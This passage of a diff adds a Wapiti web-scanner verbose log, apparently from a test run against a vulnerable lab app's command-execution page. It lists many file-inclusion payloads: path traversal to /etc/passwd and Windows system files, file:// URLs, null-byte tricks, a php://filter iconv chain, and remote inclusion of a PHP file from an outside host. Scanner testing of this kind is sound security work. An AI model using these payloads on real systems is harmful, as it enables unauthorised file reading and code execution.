+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:40.965 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:40.990 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.009 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.026 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.041 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.075 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.109 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&Submit=Submit
+2024-03-20 12:43:41.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.194 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.210 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.225 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.254 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.284 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.300 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.317 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.332 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.371 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.389 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.427 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.446 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.464 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.482 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.501 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.545 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.562 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.580 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=file%3A%2F%2F%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.619 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&Submit=Submit
+2024-03-20 12:43:41.636 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&Submit=Submit
+2024-03-20 12:43:41.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&Submit=Submit
+2024-03-20 12:43:41.678 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.726 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&Submit=Submit
+2024-03-20 12:43:41.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&Submit=Submit
+2024-03-20 12:43:41.777 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 12:43:41.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 12:43:41.839 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%2Fetc%2Fpasswd
+2024-03-20 12:43:41.869 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%2Fetc%2Fpasswd%00
+2024-03-20 12:43:41.894 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%2Fetc%2Fservices
+2024-03-20 12:43:41.915 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=%2Fetc%2Fservices%00
+2024-03-20 12:43:41.945 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 12:43:41.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 12:43:41.999 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 12:43:42.023 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.043 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:42.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 12:43:42.089 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 12:43:42.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 12:43:42.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.159 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 12:43:42.186 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.214 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 12:43:42.234 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 12:43:42.289 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.313 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 12:43:42.337 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.364 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 12:43:42.392 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:42.418 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 12:43:42.442 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/vulnerabilities/exec/ (0)
+	data: ip=fuzz&Submit=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7